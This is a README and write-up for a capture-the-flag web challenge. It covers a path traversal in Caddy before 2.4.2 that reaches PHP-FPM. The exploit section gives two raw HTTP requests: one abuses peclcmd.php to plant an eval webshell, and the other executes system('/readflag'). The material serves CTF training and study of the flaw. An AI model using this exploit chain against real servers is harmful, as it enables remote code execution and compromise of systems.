# VerySave

## How to Setup Environment

`cd docker && docker-compose up -d`

## Write Up

I learn a funny issue from [2-and-a-bit-of-magic](https://speakerdeck.com/greendog/2-and-a-bit-of-magic)

Caddy before 2.4.2 can path traversal in PHP-FPM

At the same time, I think of [MeowWorld in 巅峰极客](https://www.anquanke.com/post/id/218977#h2-3) and [camp-ctf-2015](https://web.archive.org/web/20201022203937/https://khack40.info/camp-ctf-2015-trolol-web-write-up/). Great thanks to them, I made a fun challenge.

register_argc_argv is TRUE in default PHP docker configuration and peclcmd.php is in default PHP docker.

### Exploit

```
GET /../usr/local/lib/php/peclcmd.php?+config-create+/tmp/<?=eval($_POST[1]);?>/*+/srv/qqqq.php HTTP/1.1
Host: test.local:54120
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```

And then

```
POST /../tmp/qqqq.php HTTP/1.1
Host: test.local:54120
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

1=system('/readflag');
```